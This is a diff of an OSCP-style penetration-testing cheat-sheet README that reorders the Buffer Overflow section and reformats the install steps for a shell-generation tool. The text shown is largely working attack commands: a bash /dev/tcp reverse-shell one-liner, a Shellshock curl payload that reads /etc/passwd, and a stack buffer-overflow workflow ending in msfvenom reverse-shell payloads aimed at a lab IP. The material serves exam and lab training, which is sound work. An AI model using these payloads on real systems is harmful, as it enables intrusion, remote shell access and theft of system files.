@@ -52,10 +52,10 @@
   - [PROOFS](#proofs)
   - [REVERSE SHELL](#reverse-shell)
   - [SHELLSHOCK](#shellshock)
+  - [Buffer Overflow](#buffer-overflow)
   - [USEFUL LINUX COMMANDS](#useful-linux-commands)
   - [USEFUL WINDOWS COMMANDS](#useful-windows-commands)
   - [ZIP](#zip)
-  - [Buffer Overflow](#buffer-overflow)
 
 ## OSCP SubReddit
 - [OSCP Reddit!](https://www.reddit.com/r/oscp)
@@ -1705,18 +1705,14 @@
   - [highon.coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
   - [Cool Reverse Shell Generator](https://0day.exposed/reverseshell/)
 
-- Amazing tool for shell generation
-- 
-  ```
-  # Download
-  git clone https://github.com/ShutdownRepo/shellerator
+- Amazing tool for shell generation (Should be installed if you used my Kali_setup.sh script)
+- Download
+  - `git clone https://github.com/ShutdownRepo/shellerator`
+- Install requirements
+  - `pip3 install --user -r requirements.txt`
+- Executable from anywhere
+  - `sudo cp shellrator.py /bin/shellrator`
 
-  # Install requirements
-  pip3 install --user -r requirements.txt
-
-  # Executable from anywhere
-  sudo cp shellrator.py /bin/shellrator
-  ```
 
 - Bash
   - `bash -i >& /dev/tcp/<IP>/<PORT> 0>&1`
@@ -1782,6 +1778,39 @@
 - `curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" <URL>/cgi-bin/<SCRIPT>`
 
 
+## Buffer Overflow
+- <https://github.com/cytopia/badchars>
+- Spike
+  - `generic_send_tcp 192.168.174.1 31337 ~/Code/buffer-overflow/stats.spk 0 0`
+
+- Fuzz
+  - `~/Code/buffer-overflow/fuzzer.py`
+
+- Generate unique pattern:
+  - `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <bufferlen>`
+
+- Finding the offset
+  - `~/Code/buffer-overflow/offset.py`
+  - (1) `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <bufferlen> -q <EIP address>`
+  - (1) `!mona findmsp`
+
+- Confirm offset
+  - `~/Code/buffer-overflow/overwrite_eip.py`
+- Find badchars
+  - `~/Code/buffer-overflow/badchars.py`
+
+- Find Jump
+  - `!mona modules`
+  - `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb > JMP ESP`
+  - (1) `!mona find -s "\xff\xe4" -m <unprotected module>`
+  - (1) `!mona jmp -r ESP -m <unprotected module> / !mona jmp -r esp -cpb "<badchars>"`
+
+- Exploit buffer overflow
+  - (1) `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.174.128 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"`
+  - (1) `msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.174.128 LPORT=4444 -f c -b "\x00,\x20"`
+  - `~/Code/buffer-overflow/exploit_buffer_overflow.py`
+
+
 ## USEFUL LINUX COMMANDS
 - Find a file
   - `locate <FILE>`
@@ -1834,36 +1863,3 @@
 - `fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' file.zip`
 - `zip2john file.zip > zip.john`
 - `john --wordlist=<PASSWORDS_LIST> zip.john`
-
-
-## Buffer Overflow
-- <https://github.com/cytopia/badchars>
-- Spike
-  - `generic_send_tcp 192.168.174.1 31337 ~/Code/buffer-overflow/stats.spk 0 0`
-
-- Fuzz
-  - `~/Code/buffer-overflow/fuzzer.py`
-
-- Generate unique pattern:
-  - `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <bufferlen>`
-
-- Finding the offset
-  - `~/Code/buffer-overflow/offset.py`
-  - (1) `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <bufferlen> -q <EIP address>`
-  - (1) `!mona findmsp`
-
-- Confirm offset
-  - `~/Code/buffer-overflow/overwrite_eip.py`
-- Find badchars
-  - `~/Code/buffer-overflow/badchars.py`
-
-- Find Jump
-  - `!mona modules`
-  - `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb > JMP ESP`
-  - (1) `!mona find -s "\xff\xe4" -m <unprotected module>`
-  - (1) `!mona jmp -r ESP -m <unprotected module> / !mona jmp -r esp -cpb "<badchars>"`
-
-- Exploit buffer overflow
-  - (1) `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.174.128 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"`
-  - (1) `msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.174.128 LPORT=4444 -f c -b "\x00,\x20"`
-  - `~/Code/buffer-overflow/exploit_buffer_overflow.py`
